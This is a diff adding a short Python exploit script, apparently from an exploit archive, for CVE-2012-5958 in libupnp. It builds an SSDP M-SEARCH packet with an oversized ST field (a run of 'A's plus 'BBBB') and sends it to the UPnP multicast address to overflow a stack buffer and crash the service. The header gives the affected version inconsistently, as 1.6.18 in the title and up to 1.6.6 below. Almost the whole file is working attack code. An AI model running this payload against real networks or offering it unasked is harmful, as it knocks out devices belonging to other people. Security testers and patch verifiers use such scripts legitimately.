@@ -1,0 +1,18 @@
+# Exploit Title: libupnp 1.6.18 - Stack-based buffer overflow (DoS)
+# Date: 2020-08-20
+# Exploit Author: Patrik Lantz
+# Vendor Homepage: https://pupnp.sourceforge.io/
+# Software Link: https://sourceforge.net/projects/pupnp/files/pupnp/libUPnP%201.6.6/libupnp-1.6.6.tar.bz2/download
+# Version: <= 1.6.6
+# Tested on: Linux
+# CVE : CVE-2012-5958
+
+import socket
+
+payload = "M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nST:uuid:schemas:device:"
+payload += "A"*324 + "BBBB"
+payload += ":urn:\r\nMX:2\r\nMAN:\"ssdp:discover\"\r\n\r\n"
+
+byte_message = bytes(payload)
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+s.sendto(byte_message, ("239.255.255.250", 1900))
